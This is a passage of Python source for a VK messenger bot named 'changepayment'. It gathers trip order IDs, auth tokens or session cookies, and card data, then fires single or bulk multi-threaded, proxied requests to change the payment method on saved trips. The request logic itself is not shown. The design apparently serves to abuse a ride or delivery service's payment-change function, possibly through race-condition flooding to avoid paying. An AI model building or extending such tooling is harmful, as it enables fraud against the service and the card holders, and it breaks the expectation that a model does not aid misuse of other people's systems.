            return self.handle_change_payment_mode(user_id, text)

        if step == "trip_orderid_new":
            if not text:
                self.send(user_id, "Нужно указать orderid (без него не получится).")
                return True
            self._fill_trip_field(user_id, "orderid", text)
            self.update_state(user_id, step="trip_token_new")
            self.send(user_id, "Пришли token2. Карту и ID найду сам.")
            return True

        if step == "trip_token_new":
            trip_id = state.get("active_trip")
            if not text:
                self.send(user_id, "Нужен token2, чтобы продолжить.")
                return True
            self._fill_trip_field(user_id, "token2", text)
            autofill_note = self._autofill_trip_template(trip_id, user_id, text, is_session=False)
            summary_parts = ["Поездка сохранена."]
            if autofill_note:
                summary_parts.append(autofill_note)
            trip = list_trip_templates(user_id)[0] if list_trip_templates(user_id) else None
            if trip:
                summary_parts.append("Текущие данные:\n" + self._format_trip(1, trip))
            self.send(user_id, "\n".join(summary_parts), self.start_keyboard())
            self.reset_state(user_id)
            return True

        if step == "trip_list":
            lowered = text.lower()
            if lowered.startswith("удалить"):
                try:
                    idx = int(lowered.replace("удалить", "").strip())
                    trip = trips[idx - 1]
                except Exception:  # noqa: BLE001
                    self.send(user_id, "Не понял номер для удаления.", self.start_keyboard())
                    return True
                delete_trip_template(trip.get("id"), user_id)
                self.send(user_id, "Удалил поездку.", self.start_keyboard())
                self._send_trips_list(user_id)
                return True
            if lowered.startswith("данные"):
                try:
                    idx = int(lowered.replace("данные", "").strip())
                    trip = trips[idx - 1]
                except Exception:  # noqa: BLE001
                    self.send(user_id, "Не понял номер для просмотра.", self.start_keyboard())
                    return True
                self.send(user_id, self._format_trip(idx, trip), self.start_keyboard())
                return True
            if lowered == "очистить все":
                for trip in trips:
                    delete_trip_template(trip.get("id"), user_id)
                self.send(user_id, "Все поездки удалены.", self.start_keyboard())
                self._send_trips_list(user_id)
                return True
            try:
                idx = int(text)
                trip = trips[idx - 1]
            except Exception:  # noqa: BLE001
                self.send(user_id, "Напиши номер поездки или 'удалить N'.", self.start_keyboard())
                return True
            self._use_trip(user_id, trip)
            return True

        if step == "token":
            if text:
                notes: list[str] = []
                if "session" in text.lower() or text.isdigit():
                    data["session_cookie"] = text
                    data.pop("token", None)
                    notes.extend(self._autofill_from_session(text, data))
                else:
                    data["token"] = text
                    data.pop("session_cookie", None)
                    note = self._autofill_from_token(text, data)
                    if note:
                        notes.append(note)
                self.update_state(user_id, data=data)
                if notes:
                    self.send(user_id, "\n".join(notes))
                self._ask_next_field(user_id, "orderid")
                return True
            return False

        if step == "orderid":
            data["orderid"] = text
            self.update_state(user_id, data=data)
            self._ask_next_field(user_id, "card")
            return True

        if step == "card":
            data["card"] = text
            self.update_state(user_id, data=data)
            self._ask_next_field(user_id, "id")
            return True

        if step == "id":
            data["id"] = text
            self.update_state(user_id, data=data)
            flow = state.get("flow")
            if flow == "bulk":
                self._ask_next_field(user_id, "threads")
            else:
                self._ask_schedule(user_id)
            return True

        if step == "threads":
            try:
                threads = int(text)
                if threads <= 0:
                    raise ValueError
            except ValueError:
                self.send(user_id, "Нужен положительный номер потоков.")
                return True
            data["threads"] = threads
            self.update_state(user_id, data=data)
            self._ask_next_field(user_id, "total")
            return True

        if step == "total":
            try:
                total_requests = int(text)
                if total_requests <= 0:
                    raise ValueError
            except ValueError:
                self.send(user_id, "Введи целое положительное число запросов.")
                return True
            data["total"] = total_requests
            self.update_state(user_id, data=data)
            self._ask_schedule(user_id)
            return True

        if step == "schedule":
            lowered = text.lower()
            if lowered == "отправить сейчас":
                self.execute_request(user_id)
                return True
            if lowered == "отправить через...":
                self.update_state(user_id, step="delay")
                self.send(user_id, "Через сколько минут запустить?")
                return True
            return False

        if step == "delay":
            try:
                minutes = int(text)
                if minutes < 0:
                    raise ValueError
            except ValueError:
                self.send(user_id, "Укажи количество минут цифрами.")
                return True
            timer = threading.Timer(minutes * 60, self.execute_request, args=(user_id,))
            timer.start()
            self.update_state(user_id, timer=timer)
            self.send(user_id, f"Окей, стартуем через {minutes} мин.")
            self.update_state(user_id, step=None)
            return True

        return False

    def execute_request(self, user_id: int):
        state = self.state.get(user_id) or {}
        data = state.get("data", {})
        flow = state.get("flow")

        if not any([data.get("token"), data.get("session_cookie")]):
            self.send(user_id, "Не все данные заданы. Нажми «💳 Поменять оплату» и попробуй снова.")
            return
        if not self._ensure_request_data(user_id, data, trip_id=state.get("active_trip")):
            self.send(user_id, "Не хватает данных (orderid, card-x или ID). Проверь поездку или токен.")
            return

        if flow == "bulk":
            threads = int(data.get("threads", 1))
            total = int(data.get("total", 0))
            if total <= 0:
                self.send(user_id, "Укажи количество запросов для потоков.")
                return

            self.send(
                user_id,
                "Запускаю массовую отправку. После завершения пришлю сводку и запишу логи в БД.",
                self.start_keyboard(),
            )
            session_id, completed, success = self._run_bulk(user_id, data, threads, total)
            failed = max(completed - success, 0)
            self.send(
                user_id,
                f"Потоки завершены.\nID сессии: {session_id}\nУспешных: {success}\nНеуспешных: {failed}",
                self.start_keyboard(),
            )
        else:
            self.send(user_id, "Отправляю запрос...", self.start_keyboard())
            session_id, ok, status, resp = self._run_single(user_id, data)
            self.send(
                user_id,
                self._format_response(ok, status, resp, session_id),
                self.start_keyboard(),
            )

        self.reset_state(user_id)

    def handle_profile(self, user_id: int):
        total_requests = get_request_count_for_user(user_id)
        text = (
            "👤 Профиль\n\n"
            f"VK ID: {user_id}\n"
            f"Всего отправлено запросов: {total_requests}\n"
        )
        self.send(user_id, text, self.start_keyboard())

    def handle_event(self, event):
        user_id = event.user_id
        text = (event.text or "").strip()

        lowered = text.lower()
        if lowered in {"/start", "start", "начать"}:
            self.reset_state(user_id)
            self.send(
                user_id,
                "Привет! Я VK-версия бота changepayment. Используй кнопки ниже.\n"
                f"Прокси: {proxy_state_text()}",
                self.start_keyboard(),
            )
            return

        if text == "🔙 Назад":
            self.reset_state(user_id)
            self.send(user_id, "Вернул в главное меню.", self.start_keyboard())
            return

        if self.handle_stateful_input(user_id, text):
            return

        if text == "➕ Добавить поездку":
            self.reset_state(user_id)
            self._prepare_trip_creation(user_id)
            return

        if text == "💳 Поменять оплату":
            self.reset_state(user_id)
            self._send_trips_list(user_id)
            self.send(user_id, "Выбери поездку номером и запусти смену или потоки.", self.start_keyboard())
            return

        if text == "🗂 Поездки":
            self.reset_state(user_id)
            self._send_trips_list(user_id)
            return

        self.send(user_id, "Не понял команду, используй кнопки ниже.", self.start_keyboard())

    def run(self):
        logger.info("Запускаю VK-бота")
        try:
            for event in self.longpoll.listen():
                if event.type == VkEventType.MESSAGE_NEW and event.to_me:
                    try:
                        self.handle_event(event)
                    except Exception as exc:  # noqa: BLE001
                        logger.exception("Ошибка в обработке события VK: %s", exc)
        except Exception as exc:  # noqa: BLE001
            logger.exception("VK longpoll завершился с ошибкой: %s", exc)
            raise


def main():
    init_db()
    load_proxies()
    if not VK_TOKEN:
        raise RuntimeError("В конфиге не задан VK_TOKEN")
    while True:
        try:
            bot = VkBot(VK_TOKEN)
            bot.run()
        except KeyboardInterrupt:
            logger.info("VK-бот остановлен вручную.")
            break
        except Exception:
            logger.exception("VK-бот упал. Перезапуск через 5 секунд...")
            time.sleep(5)
        else:
            break


if __name__ == "__main__":
    main()
